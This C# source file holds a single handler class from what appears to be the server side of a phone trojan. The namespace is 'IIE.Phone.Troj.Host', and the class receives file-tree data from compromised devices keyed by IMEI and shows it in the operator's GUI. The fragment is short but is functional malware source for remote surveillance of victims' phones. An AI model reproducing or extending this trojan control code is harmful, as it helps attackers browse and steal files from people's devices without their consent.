using System;
using InOut;
using InOut.PacketImp;

namespace IIE.Phone.Troj.Host.Handler
{
    public class FileTreeHandler : IPacketHandler
    {

        private readonly IMainView gui;
        private readonly int channel;
        private readonly string imei;

        public FileTreeHandler(int chan, string imei, IMainView gui)
        {
            channel = chan;
            this.imei = imei;
            this.gui = gui;
        }


        public void Receive(IPacket p, string tempIMEI)
        {

        }

        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            if (tempIMEI == null) throw new ArgumentNullException("tempIMEI");
            gui.Log.LogTxt("File tree data has been received");
            c.ChannelHandlerMap[imei].RemoveListener(channel);
            var packet = (FileTreePacket)p;
            gui.UpdateFileTree(imei, packet.List);
        }
    }
}
